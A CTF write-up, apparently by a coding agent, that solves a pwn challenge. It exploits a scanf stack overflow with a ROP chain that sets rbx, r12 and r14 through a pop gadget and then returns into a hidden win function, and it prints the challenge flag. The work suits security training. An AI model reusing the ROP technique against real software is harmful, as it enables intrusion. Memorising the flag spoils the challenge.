# coding agent

Contest note: CTF jeopardy challenge. The target is a flag, not an ACM-style output.

Flag:

```text
CPCTF{u53_sc4nf_w17h_s1z3_0f_buFf3r5}
```

`main` is tiny. It prints a prompt, then does:

```c
char buf[0x20];
scanf("%s", buf);
puts("Sorry, your weekly limit has been reached. Please try again next week.");
```

So this is a straightforward stack overflow:

- buffer size: `0x20`
- saved `rbp`: `0x8`
- saved `rip` offset: `0x28`
- no canary, no PIE, NX on

There is a hidden `win` at `0x4013f8`, but it refuses to proceed unless the incoming callee-saved registers match three magic constants:

- `r14 == 0x00007a0000006876`
- `rbx == 0x03b001d000084000`
- `r12 == 0x0000000700002c40`

Conveniently, the epilogue of `some_function` gives a perfect multi-pop gadget:

```asm
0x4013ed: pop rbx
0x4013ee: pop rbp
0x4013ef: pop r12
0x4013f1: pop r13
0x4013f3: pop r14
0x4013f5: pop r15
0x4013f7: ret
```

So the whole exploit is just:

1. Overflow to RIP with `0x28` bytes.
2. Return to `0x4013ed`.
3. Pop the required `rbx`, `r12`, and `r14` values.
4. Return into `win`.

`win` then decodes the filename `flag.txt`, opens it, reads up to `0x100` bytes, and writes the result to stdout.

Minimal chain:

```python
payload  = b"A" * 0x28
payload += p64(0x4013ed)
payload += p64(0x03b001d000084000)  # rbx
payload += p64(0xdeadbeefdeadbeef)  # rbp
payload += p64(0x0000000700002c40)  # r12
payload += p64(0x4141414141414141)  # r13
payload += p64(0x00007a0000006876)  # r14
payload += p64(0x4242424242424242)  # r15
payload += p64(0x4013f8)            # win
```

Running it against the remote service prints:

```text
CPCTF{u53_sc4nf_w17h_s1z3_0f_buFf3r5}
```

`solve.py` automates both local testing (`--local`) and the remote exploit.
